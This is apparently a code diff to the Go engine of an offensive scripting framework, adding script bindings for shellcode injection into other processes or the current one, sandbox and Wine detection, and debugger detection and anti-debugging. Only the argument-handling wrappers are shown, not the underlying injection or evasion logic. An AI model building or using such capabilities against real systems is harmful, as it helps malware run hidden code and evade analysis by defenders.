@@ -40,6 +40,12 @@
 //  WriteFile(path, fileData, perms) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.WriteFile
 //  WriteTempFile(name, fileData) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.WriteTempFile
 //
+// Library injection
+//
+// Functions in injection:
+//  InjectIntoProc(shellcode, proccessID) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.InjectIntoProc
+//  InjectIntoSelf(shellcode) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.InjectIntoSelf
+//
 // Library net
 //
 // Functions in net:
@@ -84,6 +90,13 @@
 //  DelRegKeyValue(registryString, path, value) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.DelRegKeyValue
 //  QueryRegKey(registryString, path) - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.QueryRegKey
 //
+// Library stealth
+//
+// Functions in stealth:
+//  CheckIfCPUCountIsHigherThanOne() - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.CheckIfCPUCountIsHigherThanOne
+//  CheckIfRAMAmountIsBelow1GB() - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.CheckIfRAMAmountIsBelow1GB
+//  CheckSandboxUsernames() - https://godoc.org/github.com/gen0cide/gscript/engine/#Engine.CheckSandboxUsernames
+//
 package engine
 
 import (
@@ -106,6 +119,10 @@ func (e *Engine) CreateVM() {
 	e.VM.Set("Asset", e.vmAsset)
 	e.VM.Set("B64Decode", e.vmB64Decode)
 	e.VM.Set("B64Encode", e.vmB64Encode)
+	e.VM.Set("CheckIfCPUCountIsHigherThanOne", e.vmCheckIfCPUCountIsHigherThanOne)
+	e.VM.Set("CheckIfRAMAmountIsBelow1GB", e.vmCheckIfRAMAmountIsBelow1GB)
+	e.VM.Set("CheckIfWineGetUnixFileNameExists", e.vmCheckIfWineGetUnixFileNameExists)
+	e.VM.Set("CheckSandboxUsernames", e.vmCheckSandboxUsernames)
 	e.VM.Set("Chmod", e.vmChmod)
 	e.VM.Set("CopyFile", e.vmCopyFile)
 	e.VM.Set("CreateDir", e.vmCreateDir)
@@ -125,10 +142,15 @@ func (e *Engine) CreateVM() {
 	e.VM.Set("GetProcName", e.vmGetProcName)
 	e.VM.Set("HTTPGetFile", e.vmHTTPGetFile)
 	e.VM.Set("Halt", e.vmHalt)
+	e.VM.Set("InjectIntoProc", e.vmInjectIntoProc)
+	e.VM.Set("InjectIntoSelf", e.vmInjectIntoSelf)
 	e.VM.Set("InstallSystemService", e.vmInstallSystemService)
+	e.VM.Set("IsDebuggerPresent", e.vmIsDebuggerPresent)
 	e.VM.Set("IsTCPPortInUse", e.vmIsTCPPortInUse)
 	e.VM.Set("IsUDPPortInUse", e.vmIsUDPPortInUse)
 	e.VM.Set("MD5", e.vmMD5)
+	e.VM.Set("MakeDebuggable", e.vmMakeDebuggable)
+	e.VM.Set("MakeUnDebuggable", e.vmMakeUnDebuggable)
 	e.VM.Set("ModTime", e.vmModTime)
 	e.VM.Set("ModifyTimestamp", e.vmModifyTimestamp)
 	e.VM.Set("ObfuscateString", e.vmObfuscateString)
@@ -838,6 +860,104 @@ func (e *Engine) vmB64Encode(call otto.FunctionCall) otto.Value {
 	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
 	if vmRetError != nil {
 		e.Logger.WithField("function", "B64Encode").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmCheckIfCPUCountIsHigherThanOne(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "CheckIfCPUCountIsHigherThanOne").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "CheckIfCPUCountIsHigherThanOne").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	areWeInASandbox := e.CheckIfCPUCountIsHigherThanOne()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["areWeInASandbox"] = areWeInASandbox
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "CheckIfCPUCountIsHigherThanOne").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmCheckIfRAMAmountIsBelow1GB(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "CheckIfRAMAmountIsBelow1GB").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "CheckIfRAMAmountIsBelow1GB").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	areWeInASandbox := e.CheckIfRAMAmountIsBelow1GB()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["areWeInASandbox"] = areWeInASandbox
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "CheckIfRAMAmountIsBelow1GB").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmCheckIfWineGetUnixFileNameExists(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "CheckIfWineGetUnixFileNameExists").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "CheckIfWineGetUnixFileNameExists").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	areWeRunningInWine, runtimeError := e.CheckIfWineGetUnixFileNameExists()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["areWeRunningInWine"] = areWeRunningInWine
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "CheckIfWineGetUnixFileNameExists").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "CheckIfWineGetUnixFileNameExists").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmCheckSandboxUsernames(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "CheckSandboxUsernames").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "CheckSandboxUsernames").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	areWeInASandbox, runtimeError := e.CheckSandboxUsernames()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["areWeInASandbox"] = areWeInASandbox
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "CheckSandboxUsernames").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "CheckSandboxUsernames").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
 		return otto.FalseValue()
 	}
 	return vmRet
@@ -1659,6 +1779,100 @@ func (e *Engine) vmHalt(call otto.FunctionCall) otto.Value {
 	return vmRet
 }
 
+func (e *Engine) vmInjectIntoProc(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 2 {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 2 {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+
+	var shellcode string
+	rawArg0, err := call.Argument(0).Export()
+	if err != nil {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("Could not export field: %s", "shellcode")
+		return otto.FalseValue()
+	}
+	switch v := rawArg0.(type) {
+	case string:
+		shellcode = rawArg0.(string)
+	default:
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("Argument type mismatch: expected %s, got %T", "string", v)
+		return otto.FalseValue()
+	}
+
+	var proccessID int64
+	rawArg1, err := call.Argument(1).Export()
+	if err != nil {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("Could not export field: %s", "proccessID")
+		return otto.FalseValue()
+	}
+	switch v := rawArg1.(type) {
+	case int64:
+		proccessID = rawArg1.(int64)
+	default:
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("Argument type mismatch: expected %s, got %T", "int64", v)
+		return otto.FalseValue()
+	}
+	runtimeError := e.InjectIntoProc(shellcode, proccessID)
+	rawVMRet := VMResponse{}
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "InjectIntoProc").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmInjectIntoSelf(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 1 {
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 1 {
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+
+	var shellcode string
+	rawArg0, err := call.Argument(0).Export()
+	if err != nil {
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Errorf("Could not export field: %s", "shellcode")
+		return otto.FalseValue()
+	}
+	switch v := rawArg0.(type) {
+	case string:
+		shellcode = rawArg0.(string)
+	default:
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Errorf("Argument type mismatch: expected %s, got %T", "string", v)
+		return otto.FalseValue()
+	}
+	runtimeError := e.InjectIntoSelf(shellcode)
+	rawVMRet := VMResponse{}
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "InjectIntoSelf").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
 func (e *Engine) vmInstallSystemService(call otto.FunctionCall) otto.Value {
 	if len(call.ArgumentList) > 4 {
 		e.Logger.WithField("function", "InstallSystemService").WithField("trace", "true").Error("Too many arguments in call.")
@@ -1736,6 +1950,34 @@ func (e *Engine) vmInstallSystemService(call otto.FunctionCall) otto.Value {
 	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
 	if vmRetError != nil {
 		e.Logger.WithField("function", "InstallSystemService").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmIsDebuggerPresent(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "IsDebuggerPresent").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "IsDebuggerPresent").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	isBeingDebugged, runtimeError := e.IsDebuggerPresent()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["isBeingDebugged"] = isBeingDebugged
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "IsDebuggerPresent").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "IsDebuggerPresent").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
 		return otto.FalseValue()
 	}
 	return vmRet
@@ -1829,6 +2071,62 @@ func (e *Engine) vmMD5(call otto.FunctionCall) otto.Value {
 	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
 	if vmRetError != nil {
 		e.Logger.WithField("function", "MD5").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmMakeDebuggable(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "MakeDebuggable").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "MakeDebuggable").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	worked, runtimeError := e.MakeDebuggable()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["worked"] = worked
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "MakeDebuggable").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "MakeDebuggable").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
+		return otto.FalseValue()
+	}
+	return vmRet
+}
+
+func (e *Engine) vmMakeUnDebuggable(call otto.FunctionCall) otto.Value {
+	if len(call.ArgumentList) > 0 {
+		e.Logger.WithField("function", "MakeUnDebuggable").WithField("trace", "true").Error("Too many arguments in call.")
+		return otto.FalseValue()
+	}
+	if len(call.ArgumentList) < 0 {
+		e.Logger.WithField("function", "MakeUnDebuggable").WithField("trace", "true").Error("Too few arguments in call.")
+		return otto.FalseValue()
+	}
+	worked, runtimeError := e.MakeUnDebuggable()
+	rawVMRet := VMResponse{}
+
+	rawVMRet["worked"] = worked
+
+	if runtimeError != nil {
+		e.Logger.WithField("function", "MakeUnDebuggable").WithField("trace", "true").Errorf("<function error> %s", runtimeError.Error())
+		rawVMRet["runtimeError"] = runtimeError.Error()
+	} else {
+		rawVMRet["runtimeError"] = nil
+	}
+	vmRet, vmRetError := e.VM.ToValue(rawVMRet)
+	if vmRetError != nil {
+		e.Logger.WithField("function", "MakeUnDebuggable").WithField("trace", "true").Errorf("Return conversion failed: %s", vmRetError.Error())
 		return otto.FalseValue()
 	}
 	return vmRet
